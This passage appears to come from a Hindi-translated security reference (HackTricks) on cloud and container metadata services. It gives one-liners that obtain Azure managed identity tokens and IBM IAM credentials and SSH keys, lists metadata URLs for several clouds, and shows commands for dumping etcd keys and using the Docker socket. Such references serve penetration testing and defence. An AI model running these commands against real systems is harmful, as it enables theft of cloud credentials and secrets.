Write-Host "Storage Token: $storageToken"


# Using oneliners

## Get management token
(Invoke-RestMethod -Uri "${env:IDENTITY_ENDPOINT}?resource=https://management.azure.com/&api-version=2019-08-01" -Headers @{ "X-IDENTITY-HEADER" = "$env:IDENTITY_HEADER" }).access_token

## Get graph token
(Invoke-RestMethod -Uri "${env:IDENTITY_ENDPOINT}?resource=https://graph.microsoft.com/&api-version=2019-08-01" -Headers @{ "X-IDENTITY-HEADER" = "$env:IDENTITY_HEADER" }).access_token

## Get vault token
(Invoke-RestMethod -Uri "${env:IDENTITY_ENDPOINT}?resource=https://vault.azure.net/&api-version=2019-08-01" -Headers @{ "X-IDENTITY-HEADER" = "$env:IDENTITY_HEADER" }).access_token

## Get storage token
(Invoke-RestMethod -Uri "${env:IDENTITY_ENDPOINT}?resource=https://storage.azure.com/&api-version=2019-08-01" -Headers @{ "X-IDENTITY-HEADER" = "$env:IDENTITY_HEADER" }).access_token

## Remember that in Automation Accounts it might be declared the client ID of the assigned user managed identity inside the variable that can be gatehred with:
Get-AutomationVariable -Name 'AUTOMATION_SC_USER_ASSIGNED_IDENTITY_ID'
```
{{#endtab}}
{{#endtabs}}

## IBM Cloud

> [!WARNING]
> ध्यान दें कि IBM में डिफ़ॉल्ट रूप से मेटाडेटा सक्षम नहीं है, इसलिए यह संभव है कि आप इसे एक्सेस नहीं कर पाएंगे, भले ही आप IBM क्लाउड VM के अंदर हों।
```bash
export instance_identity_token=`curl -s -X PUT "http://169.254.169.254/instance_identity/v1/token?version=2022-03-01"\
-H "Metadata-Flavor: ibm"\
-H "Accept: application/json"\
-d '{
"expires_in": 3600
}' | jq -r '(.access_token)'`

# Get instance details
curl -s -H "Accept: application/json" -H "Authorization: Bearer $instance_identity_token" -X GET "http://169.254.169.254/metadata/v1/instance?version=2022-03-01" | jq

# Get SSH keys info
curl -s -X GET -H "Accept: application/json" -H "Authorization: Bearer $instance_identity_token" "http://169.254.169.254/metadata/v1/keys?version=2022-03-01" | jq

# Get SSH keys fingerprints & user data
curl -s -X GET -H "Accept: application/json" -H "Authorization: Bearer $instance_identity_token" "http://169.254.169.254/metadata/v1/instance/initialization?version=2022-03-01" | jq

# Get placement groups
curl -s -X GET -H "Accept: application/json" -H "Authorization: Bearer $instance_identity_token" "http://169.254.169.254/metadata/v1/placement_groups?version=2022-03-01" | jq

# Get IAM credentials
curl -s -X POST -H "Accept: application/json" -H "Authorization: Bearer $instance_identity_token" "http://169.254.169.254/instance_identity/v1/iam_token?version=2022-03-01" | jq
```
नीचे विभिन्न प्लेटफार्मों की मेटाडेटा सेवाओं के लिए दस्तावेज़ीकरण दिया गया है, जो उन तरीकों को उजागर करता है जिनके माध्यम से उदाहरणों के लिए कॉन्फ़िगरेशन और रनटाइम जानकारी तक पहुंचा जा सकता है। प्रत्येक प्लेटफार्म अद्वितीय एंडपॉइंट प्रदान करता है ताकि इसकी मेटाडेटा सेवाओं तक पहुंचा जा सके।

## Packetcloud

Packetcloud के मेटाडेटा तक पहुंचने के लिए, दस्तावेज़ीकरण यहाँ पाया जा सकता है: [https://metadata.packet.net/userdata](https://metadata.packet.net/userdata)

## OpenStack/RackSpace

यहाँ हेडर की आवश्यकता का उल्लेख नहीं किया गया है। मेटाडेटा तक पहुंचा जा सकता है:

- `http://169.254.169.254/openstack`

## HP Helion

यहाँ भी हेडर की आवश्यकता का उल्लेख नहीं किया गया है। मेटाडेटा यहाँ उपलब्ध है:

- `http://169.254.169.254/2009-04-04/meta-data/`

## Oracle Cloud

Oracle Cloud विभिन्न मेटाडेटा पहलुओं तक पहुंचने के लिए कई एंडपॉइंट प्रदान करता है:

- `http://192.0.0.192/latest/`
- `http://192.0.0.192/latest/user-data/`
- `http://192.0.0.192/latest/meta-data/`
- `http://192.0.0.192/latest/attributes/`

## Alibaba

Alibaba मेटाडेटा तक पहुंचने के लिए एंडपॉइंट प्रदान करता है, जिसमें उदाहरण और छवि आईडी शामिल हैं:

- `http://100.100.100.200/latest/meta-data/`
- `http://100.100.100.200/latest/meta-data/instance-id`
- `http://100.100.100.200/latest/meta-data/image-id`

## Kubernetes ETCD

Kubernetes ETCD API कुंजी, आंतरिक IP पते और पोर्ट रख सकता है। पहुंच का प्रदर्शन इस प्रकार है:

- `curl -L http://127.0.0.1:2379/version`
- `curl http://127.0.0.1:2379/v2/keys/?recursive=true`

## Docker

Docker मेटाडेटा को स्थानीय रूप से एक्सेस किया जा सकता है, जिसमें कंटेनर और छवि जानकारी पुनर्प्राप्त करने के लिए उदाहरण दिए गए हैं:

- Docker सॉकेट के माध्यम से कंटेनरों और छवियों के मेटाडेटा तक पहुंचने के लिए सरल उदाहरण:
- `docker run -ti -v /var/run/docker.sock:/var/run/docker.sock bash`
- कंटेनर के अंदर, Docker सॉकेट के साथ curl का उपयोग करें:
- `curl --unix-socket /var/run/docker.sock http://foo/containers/json`
- `curl --unix-socket /var/run/docker.sock http://foo/images/json`

## Rancher

Rancher के मेटाडेटा तक पहुंचने के लिए उपयोग किया जा सकता है:

- `curl http://rancher-metadata/<version>/<path>`

{{#include ../../banners/hacktricks-training.md}}
